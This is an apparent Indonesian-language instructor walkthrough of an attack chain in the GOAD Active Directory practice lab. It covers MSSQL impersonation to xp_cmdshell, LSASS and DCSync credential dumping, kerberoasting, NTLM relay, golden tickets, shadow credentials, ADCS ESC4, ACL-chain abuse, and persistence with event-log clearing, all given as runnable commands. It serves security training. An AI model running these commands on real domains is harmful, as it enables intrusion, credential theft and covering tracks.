# Skenario Lanjutan GOAD — "Fall of the North II: Cross-Forest Conquest" (Detail Lengkap)

Lanjutan dari `skenario-goad.md` (berakhir di Fase 8: RDP `jon.snow` ke `castelblack`). Skenario ini memakai struktur & vulnerability yang **terdokumentasi di lab GOAD** (writeup mayfly277) untuk naik dari foothold menuju Domain Admin `north`, lalu menembus forest `sevenkingdoms.local` dan `essos.local`.

> **Kunci lab:** `castelblack` (192.168.56.22) menjalankan **Windows Defender = disabled**. Artinya mimikatz/secretsdump/tools AV-detected aman dijalankan di host ini. Sebaliknya, ketiga DC (`kingslanding`, `winterfell`, `meereen`) Defender **aktif** → dumping harus lewat remote (DCSync) bukan eksekusi lokal.

---

## Fase 9 — Post-Exploitation Lokal di castelblack

### Posisi
`jon.snow` (RDP) sekaligus **MSSQL sysadmin** di castelblack. Ini adalah *low-priv user* secara OS, tapi *high-priv* di MSSQL — kombinasi yang menjadi pivot utama.

### Perintah
```powershell
whoami /all            # lihat identitas + privilege token saat ini
net user               # user lokal mesin
net localgroup Administrators   # siapa admin lokal
net share              # daftar share lokal
dir C:\                # cari file sensitif (config, script, password)
```

### Penjelasan teknis
- `whoami /all` : menampilkan SID, group membership, dan **privileges** token (mis. `SeImpersonatePrivilege`, `SeDebugPrivilege`). Ini penting: kalau ada `SeImpersonatePrivilege`, kita bisa Potato (lihat skenario upload→SYSTEM).
- `net share` : share administratif (`C$`, `ADMIN$`) + share khusus yang mungkin berisi data sensitif.
- Enum file manual (`dir`, `Get-ChildItem -Recurse`) mencari *hardcoded credentials*.

### Temuan penting di lab
- `jon.snow` bukan local admin, tapi **sysadmin MSSQL** → pivot.
- `jeor.mormont` (admin castelblack) → **password-nya di script SYSVOL**.
- `samwell.tarly` → **password-nya di LDAP `description`**.

### Poin penting
Jangan langsung brute force. Di AD, banyak password "tersembunyi" di SYSVOL/LDAP/description/script — cari dulu sebelum eksekusi mahal.

---

## Fase 10 — Eksploitasi MSSQL (impersonation → SYSTEM)

### Tujuan
Menaikkan hak di MSSQL via **impersonation**, lalu aktifkan `xp_cmdshell` → eksekusi kode sebagai service account.

### Perintah
```bash
# Login sebagai jon.snow (windows-auth)
mssqlclient.py NORTH/jon.snow:iknownothing@192.168.56.22 -windows-auth
```
Di prompt SQL interaktif:
```sql
enum_impersonate
--  -> samwell.tarly (LOGIN) -> sa ; arya.stark (USER) -> dbo

EXECUTE AS LOGIN = 'samwell.tarly'
EXECUTE AS LOGIN = 'sa'

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell whoami
--  -> NT Service\MSSQLSERVER  (setara SYSTEM di castelblack)
```

### Penjelasan teknis
**`mssqlclient.py -windows-auth`**
- `-windows-auth` : autentikasi memakai akun domain (NTLM/Kerberos) alih-alih SQL auth. `jon.snow` adalah sysadmin MSSQL sehingga punya hak penuh.

**`enum_impersonate`** (perintah bawaan mssqlclient) menampilkan hak `IMPERSONATE` yang dimiliki:
- **`EXECUTE AS LOGIN`** = impersonate **login server-level** (mis. login `sa`).
- **`EXECUTE AS USER`** = impersonate **user database-level** (mis. user `dbo`).

**Mekanisme privilege escalation:**
1. `jon.snow` bisa `EXECUTE AS LOGIN = 'samwell.tarly'`.
2. `samwell.tarly` bisa `EXECUTE AS LOGIN = 'sa'` (login admin tertinggi MSSQL).
3. Setelah menjadi `sa`, kita aktifkan `xp_cmdshell` (extended stored procedure yang mengeksekusi perintah OS).
4. `xp_cmdshell` berjalan sebagai **service account MSSQL** = `NT Service\MSSQLSERVER` — punya privilege lokal tinggi (setara SYSTEM).

### Poin penting
- `xp_cmdshell` nonaktif secara default (sejak 2005); aktifkan via `sp_configure` dua tahap (advanced options → xp_cmdshell).
- Dari `NT Service\MSSQLSERVER`, attacker bisa dump LSASS atau membuat admin baru.

---

## Fase 11 — Credential Dumping (LSASS + SYSVOL + LDAP)

### Tujuan
Ambil hash/plaintext kredensial dari memori dan penyimpanan AD.

### Perintah
```bash
# 11.1) Dump SAM/LSASS/session di castelblack (butuh admin lokal)
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22

# 11.2) Ambil hash user yang sedang login (robb.stark bot login 3 menit)
mimikatz.exe "sekurlsa::logonpasswords"
```

### Penjelasan teknis
**`secretsdump.py`**
- Menggunakan remote registry/SAM untuk menarik **SAM**, **LSA secrets**, dan **NTDS** (kalau di DC).
- Output hash format `user:rid:lmhash:nthash:::`.

**`mimikatz sekurlsa::logonpasswords`**
- Membaca **kredensial di memori LSASS** (plaintext/logon session).
- `robb.stark` adalah "bot" yang **login setiap 3 menit** ke castelblack → session-nya hadir di LSASS → bisa diambil.

### Temuan penting
- `robb.stark` (session bot) → **admin di winterfell**.
- `jeor.mormont` → password di **script SYSVOL** (share `\\north.sevenkingdoms.local\SYSVOL`).
- `samwell.tarly` → password di **LDAP `description`** (query: `GetADUsers.py` / `ldapsearch`).

### Poin penting
- Defender **off** di castelblack membuat mimikatz berjalan tanpa deteksi.
- Cari password di SYSVOL dan LDAP description sebelum teknik yang lebih mahal.

---

## Fase 12 — Kerberoasting (robb.stark) + GPO Abuse

### Perintah
```bash
# 12.1) robb.stark punya SPN -> kerberoast & crack
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 \
  north.sevenkingdoms.local/jon.snow:iknownothing -outputfile rb.hashes
hashcat -m 13100 -a 0 rb.hashes /usr/share/wordlists/rockyou.txt
#  -> robb.stark = admin di winterfell

# 12.2) samwell.tarly bisa edit GPO "STARKWALLPAPER" -> RCE via GPO
# (tambahkan scheduled task / startup script di GPO tersebut)
```

### Penjelasan teknis
**12.1 Kerberoast** — sama seperti Fase 6, tapi kali ini target spesifik `robb.stark` yang SPN-nya terdeteksi. Hash TGS dicrack → password `robb.stark` → ia adalah **admin di winterfell (DC north)**.

**12.2 GPO Abuse** — `samwell.tarly` punya hak edit pada GPO **`STARKWALLPAPER`**. Prinsip: GPO yang di-apply ke mesin target dapat menyuntikkan *Scheduled Task* / *Startup Script* yang menjalankan payload → **RCE** di semua komputer yang menerapkan GPO tersebut.

Tool: `pyGPOabuse` (impacket) atau `SharpGPOAbuse`.

### Poin penting
- `robb.stark` (admin winterfell) dan `samwell.tarly` (GPO edit) = dua jalan menuju DA NORTH.

---

## Fase 13 — NTLM Relay (Responder) → DA NORTH

### Tujuan
Manfaatkan **bot LLMNR** untuk me-relay autentikasi NTLM dan mendapatkan sesi sebagai DA North **tanpa crack password**.

### Prasyarat
- `eddard.stark` = **DOMAIN ADMIN NORTH** + bot yang mengirim request LLMNR tiap 5 menit.
- `robb.stark` = bot LLMNR tiap 3 menit.
- `signing:False` pada target relay (cek di Fase 1).

### Perintah
```bash
# Terminal 1: poison LLMNR/NBT-NS
sudo responder -I eth0 -wd

# Terminal 2: relay hash ke winterfell
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -socks
#  targets.txt = 192.168.56.11
```

### Penjelasan teknis
**Responder** — ketika mesin Windows gagal resolve nama via DNS, ia mengirim **LLMNR/NBT-NS multicast**. Responder menjawab *"saya host itu"* dan **menangkap hash NTLM** dari permintaan otentikasi yang menyusul.

**ntlmrelayx** — alih-alih crack hash, tool ini **me-relay** otentikasi NTLM ke target lain (winterfell). Karena `eddard.stark` adalah admin di winterfell, relay berhasil → ntlmrelayx mengeksekusi perintah / membuka **socks proxy** (`-socks`) untuk masuk sebagai `eddard.stark`.

### Output
```
[*] Authenticating against smb://192.168.56.11 as NORTH/EDDARD.STARK SUCCEED
[*] SOCKS: ...
```
→ **DOMAIN ADMIN NORTH TERCAPAI**.

### Poin penting
- Ini **relay**, bukan crack — attacker tak pernah tahu password.
- Syarat: SMB signing off di target + akun relay adalah admin di target.
- Fase 13 adalah **lompatan kunci** keseluruhan skenario.

---

## Fase 14 — DCSync NORTH → Golden Ticket

### Perintah
```bash
# Dump krbtgt & semua hash domain via DCSync
secretsdump.py -just-dc north.sevenkingdoms.local/eddard.stark:'<hash>'@192.168.56.11

# Golden ticket (persistence domain NORTH)
ticketer.py -nthash <krbtgt_nthash> -domain-sid <NORTH-SID> \
  -domain north.sevenkingdoms.local Administrator
```

### Penjelasan teknis
**DCSync** — teknik meminta DC mereplikasi data (termasuk hash `krbtgt` & semua user) dengan hak `DS-Replication-Get-Changes`. `secretsdump.py -just-dc` mensimulasikan request replikasi DRSR (Directory Replication Service Remote).

**Golden Ticket** — dengan hash `krbtgt` (KDC master key) + SID domain, attacker bisa **membuat TGT palsu** untuk user mana pun (mis. `Administrator`) tanpa berinteraksi dengan DC. `ticketer.py` menghasilkan `.ccache` yang bisa dipakai `-k` (pass-the-ticket).

### Poin penting
- DCSync hanya butuh **hak replikasi** (biasanya DA / anggota "Domain Controllers").
- Golden ticket valid hingga krbtgt di-reset (bisa bertahun-tahun) → persistence kuat.

---

## Fase 15 — Cross-Forest via MSSQL Linked Server (castelblack → braavos)

### Tujuan
Menyeberangi batas forest (north → essos) lewat **MSSQL trusted link**, tanpa kredensial domain essos.

### Perintah
```sql
-- dari mssqlclient castelblack
SELECT * FROM openquery("braavos", 'SELECT @@version');

EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;
      sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT "braavos";

EXEC ('xp_cmdshell ''whoami''') AT "braavos";
--  -> eksekusi kode di braavos.essos.local (forest ESSOS)
```

### Penjelasan teknis
**MSSQL Linked Server** — fitur yang menghubungkan satu instance MSSQL ke instance lain. Konfigurasi lab: castelblack punya link ke `braavos` dengan kredensial `jon.snow → sa` (jadi ketika mengeksekusi query jarak jauh, ia berjalan sebagai `sa` di braavos).

- `OPENQUERY("braavos", ...)` : jalankan query passthrough ke server terlink.
- `EXEC (...) AT "braavos"` : jalankan perintah di server terlink.
- Aktifkan `xp_cmdshell` di braavos (remote) → RCE di mesin essos.

### Poin penting
- Trusted link **menembus batas forest** karena kredensial link sudah ditanam — attacker tinggal "menumpang".
- Ini bukan trust AD, tapi trust antar MSSQL — sering luput dari monitoring.

---

## Fase 16 — Kompromi ESSOS

### Tujuan
Naik dari foothold di braavos menjadi **Domain Admin essos.local**.

### Perintah
```bash
# 16.1) braavos MSSQL: admin khal.drogo; impersonate jorah.mormont -> sa
mssqlclient.py ESSOS/khal.drogo:'<pass>'@192.168.56.31 -windows-auth
#  -> jorah.mormont : Read LAPS password + mssql trusted link

# 16.2) khal.drogo punya GenericAll pada viserys -> shadow credentials
pywhisker.py -d essos.local -u khal.drogo -p '<pass>' \
  --target viserys.targaryen --action add
getST.py -dc-ip 192.168.56.12 -spn cifs/meereen.essos.local \
  -impersonate viserys.targaryen -pfx <cert.pfx>

# 16.3) khal.drogo punya GenericAll pada template ECS4 -> ADCS ESC4
certipy find -u khal.drogo@essos.local -p '<pass>' \
  -dc-ip 192.168.56.12 -vulnerable
certipy template -u khal.drogo@essos.local -p '<pass>' \
  -template ECS4 -save-old -dc-ip 192.168.56.12
certipy req -u khal.drogo@essos.local -p '<pass>' \
  -template ECS4 -ca 'ESSOS-CA' -upn daenerys.targaryen@essos.local
```

### Penjelasan teknis

**16.1 MSSQL braavos** — `khal.drogo` admin MSSQL; `jorah.mormont` bisa `EXECUTE AS LOGIN → sa`. `jorah.mormont` juga punya **Read LAPS password** dan **trusted link** (balik ke castelblack).

**16.2 Shadow Credentials (pywhisker)**
- `GenericAll` pada user = kontrol penuh, termasuk menambah **`msDS-KeyCredentialLink`** (kunci kriptografi alternatif untuk autentikasi).
- `pywhisker.py --action add` menanam key credential untuk `viserys.targaryen`.
- `getST.py -pfx <cert.pfx> -impersonate viserys.targaryen` → minta TGT sebagai `viserys` pakai sertifikat tersebut (PKINIT).

**16.3 ADCS ESC4 (certipy)**
- `certipy find -vulnerable` → deteksi template sertifikat rentan.
- ESC4 = attacker punya **hak tulis pada template sertifikat**. `certipy template -template ECS4 -save-old` memodifikasi template (mis. tambah `SAN:UPN` + client auth) agar bisa digunakan siapa pun.
- `certipy req -template ECS4 -upn daenerys.targaryen@essos.local` → minta sertifikat dengan UPN **DA essos** → login sebagai `daenerys.targaryen` → **DOMAIN ADMIN ESSOS**.

### Poin penting
- Shadow credentials & ESC4 adalah dua teknik modern (2021–2022) yang mengandalkan miskonfigurasi ACL + ADCS.

---

## Fase 17 — Menembus SEVENKINGDOMS (Root Forest)

### Tujuan
Memanfaatkan rantai ACL documented untuk menjadi DA forest root.

### Rantai ACL (dari BloodHound)
```
tywin.lannister   : password di SYSVOL (cyphered) + ForceChangePassword jaime
  -> jaime.lannister : GenericWrite joffrey.baratheon
    -> joffrey.baratheon : WriteDACL tyron.lannister
      -> tyron.lannister : Self-Membership ke Small Council
        -> Small Council : AddMember ke Dragonstone
          -> Dragonstone : WriteOwner Kingsguard
            -> Kingsguard : GenericAll stannis.baratheon
              -> stannis.baratheon : GenericAll komputer kingslanding
                -> RBCD/computer takeover -> DA
```

### Penjelasan teknis tiap edge
- **ForceChangePassword** : `tywin` bisa reset password `jaime` → ambil alih akun jaime.
- **GenericWrite** : jaime bisa menulis atribut `joffrey` (mis. `servicePrincipalName` → kerberoast, atau `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD).
- **WriteDACL** : joffrey bisa mengubah DACL `tyron` (menambahkan diri sebagai owner/full control).
- **Self-Membership** : tyron bisa memasukkan dirinya ke group `Small Council`.
- **AddMember** : Small Council bisa menambah anggota `Dragonstone`.
- **WriteOwner** : Dragonstone bisa mengubah owner `Kingsguard`.
- **GenericAll (computer)** : stannis punya kontrol penuh atas komputer `kingslanding` (DC!) → **RBCD takeover**.

### Jalur cepat
```bash
# lord.varys -> GenericAll pada grup "Domain Admins" + AdminSDHolder
# tambahkan diri ke Domain Admins langsung:
net rpc group addmem "Domain Admins" <user> -U sevenkingdoms.local/<user>%<pass> -S 192.168.56.10
```

### Perintah eksekusi
```bash
# Contoh RBCD takeover kingslanding via stannis
addcomputer.py ... ; rbcd.py ... ; getST.py ...   # (sesuai alur ACL)

# DCSync sevenkingdoms
secretsdump.py -just-dc sevenkingdoms.local/cersei.lannister:'<pass>'@192.168.56.10
```

### Poin penting
- **RBCD (Resource-Based Constrained Delegation)** : karena stannis `GenericAll` pada DC, ia bisa mengatur `msDS-AllowedToActOnBehalfOfOtherIdentity` → komputer palsu boleh impersonate user mana pun (mis. `Administrator`) ke DC.
- Hasil akhir: `krbtgt` sevenkingdoms → **full control root forest**.

---

## Fase 18 — Persistence & Cleanup

### Perintah
```bash
# Golden/Silver ticket semua domain (north, sevenkingdoms, essos)
# AdminSDHolder / Skeleton key (perhatikan Defender aktif di DC)
# DSRM / dcsync backdoor / modifikasi ACL
# Hapus jejak: clear event log (wevtutil), tutup sesi RDP
```

### Penjelasan teknis
- **Golden Ticket** : persistensi berbasis krbtgt (semua domain).
- **Skeleton Key** : patch LSASS DC agar password master apa pun diterima (butuh akses fisik/Admin DC; Defender aktif → perlu bypass).
- **DSRM backdoor** : aktifkan admin mode restore directory services untuk login darurat.
- **ACL persistence** : tinggalkan `GenericAll` pada akun tertentu agar bisa kembali.
- **Cleanup** : `wevtutil cl Security` (hapus log), hapus artefak tool, tutup sesi.

---

## Ringkasan Kill-Chain Lanjutan

| Fase | Teknik | Domain | Output |
|---|---|---|---|
| 9 | Local enum | north | foothold validasi |
| 10 | MSSQL impersonation + xp_cmdshell | north | SYSTEM castelblack |
| 11 | LSASS/SYSVOL/LDAP dump | north | hash robb/jeor/samwell |
| 12 | Kerberoast + GPO abuse | north | admin winterfell |
| 13 | NTLM relay (Responder) | north | **DA NORTH** |
| 14 | DCSync + golden ticket | north | kontrol north |
| 15 | MSSQL linked server | north→essos | foothold braavos |
| 16 | Shadow creds + ESC4 + LAPS | essos | **DA ESSOS** |
| 17 | ACL chain + RBCD + DCSync | sevenkingdoms | **DA ROOT** |
| 18 | Persistence | semua | persistensi |

---

## Catatan Pengajar

- **Fase 13** adalah lompatan kunci: relay `eddard.stark` (DA North) tanpa crack password.
- **Fase 15** menunjukkan batas *forest* bisa ditembus lewat MSSQL trusted link (bukan trust AD).
- **Fase 16** ajarkan dua serangan modern: *shadow credentials* (pywhisker) dan ADCS **ESC4** (certipy).
- **Fase 17** gunakan BloodHound untuk memvalidasi rantai ACL yang panjang sebelum eksekusi.
- Defender **aktif** di DC (kingslanding/winterfell/meereen) tapi **off** di castelblack → pilih lokasi dumping dengan bijak.
- Nilai password pastikan sesuai lab (mis. `hodor:hodor`, `rickon.stark` pola `WinterYYYY`, `robb.stark` hasil kerberoast, dsb.) — cek writeup mayfly untuk nilai eksak.
